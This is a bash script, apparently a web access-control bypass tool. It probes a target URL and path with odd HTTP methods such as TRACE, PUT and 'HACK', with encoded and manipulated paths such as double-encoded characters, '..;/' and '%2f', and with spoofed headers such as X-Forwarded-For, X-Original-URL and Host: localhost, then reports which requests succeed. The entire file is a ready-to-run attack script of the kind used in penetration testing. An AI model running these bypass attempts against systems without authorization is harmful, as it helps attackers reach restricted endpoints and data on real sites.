#!/bin/bash

# Define colors for terminal output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'  # No Color

# Function to perform an HTTP request
perform_request() {
    local url=$1
    local method=${2:-GET}
    local headers=$3

    # Perform the curl request and capture HTTP code and size in one go
    response=$(curl --connect-timeout 3 --max-time 5 -k -s -o /dev/null -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" -iL -w "%{http_code},%{size_download}" -X "$method" -H "$headers" "$url")
    http_code=$(echo "$response" | cut -d',' -f1)
    size_download=$(echo "$response" | cut -d',' -f2)

    # Colorize output based on HTTP status code
    if [ "$http_code" -eq 200 ]; then
        echo -e " $method ${GREEN}${http_code}${NC} ${size_download} --> $url $headers"
    else
        echo -e " $method ${RED}${http_code}${NC} ${size_download} --> $url $headers"
    fi
}

# URL encode a single character
url_encode() {
    local char="$1"
    printf '%%%02X' "'$char"
}

# Double URL encode a character
double_url_encode() {
    local char="$1"
    local encoded_char
    encoded_char=$(url_encode "$char")  # First encoding
    printf '%s' "$encoded_char" | sed 's/%/%25/g'  # Encode '%' into '%25'
}


# Main function
main() {
    local base_url=$1
    local path=$2

    echo -e "$base_url $path\n"

    # HTTP Method Bypass
    echo "[ HTTP METHOD BYPASS ]"
    methods=("TRACE" "HEAD" "POST" "PUT" "PATCH" "INVENTED" "HACK")

    for method in "${methods[@]}"; do
        perform_request "$base_url/$path" "$method"
    done

    # URL Bypass
    echo -e "\n[ URL BYPASS ]"

    # Extract the last character of the path
    last_char="${path: -1}"
    # URL encode the last character
    encoded_last_char=$(url_encode "$last_char")
    # Double URL encode the last character
    double_encoded_last_char=$(double_url_encode "$last_char")
    # Replace the last character of the path with the encoded and double-encoded characters
    encoded_path="${path%?}$encoded_last_char"
    double_encoded_path="${path%?}$double_encoded_last_char"

    urls=(
        "$base_url/$encoded_path"
        "$base_url/$double_encoded_path"
        "$base_url/$path"
        "$base_url///$path"
        "$base_url///$path/"
        "$base_url/./$path"
        "$base_url/../$path"
        "$base_url/*/$path"
        "$base_url/%2f/$path"
        "$base_url/$path%2f"
        "$base_url/$path%252f"
        "$base_url/$path;%2f..%2f..%2f"
        "$base_url/%2e/$path"
        "$base_url/$path/."
        "$base_url//$path//"
        "$base_url/./$path/./"
        "$base_url/$path%20"
        "$base_url/$path%09"
        "$base_url/$path?"
        "$base_url/$path.html"
        "$base_url/$path/?anything"
        "$base_url/$path#"
        "$base_url/$path/*"
        "$base_url/$path.php"
        "$base_url/$path.json"
        "$base_url/$path..;/"
        "$base_url/$path;/"
    )

    # Perform the requests
    for url in "${urls[@]}"; do
        perform_request "$url"
    done

    # Header Bypass
    echo -e "\n[ HEADER BYPASS ]"
    headers_list=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded: 127.0.0.1"
        "Forwarded-For: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1:80"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-ProxyUser-Ip: 127.0.0.1"
        "X-Original-URL: 127.0.0.1"
        "Client-IP: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "Cluster-Client-IP: 127.0.0.1"
        "Host: localhost"
        "Host: google.com"
        "X-Original-URL: $path"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-For: http://127.0.0.1"
        "X-Rewrite-URL: $path"
        "X-Host: 127.0.0.1"
        "X-Forwarded-Host: 127.0.0.1"
        "Forwarded: host=google.com"
        "Content-Length: 0"
    )

    for header in "${headers_list[@]}"; do
        perform_request "$base_url/$path" "GET" "$header"
    done
}

# Check for correct number of arguments
if [ "$#" -ne 2 ]; then
    echo -e "${RED}Usage: $0 https://example.com endpoint${NC}"
    exit 1
fi

# Call the main function
main "$1" "$2"
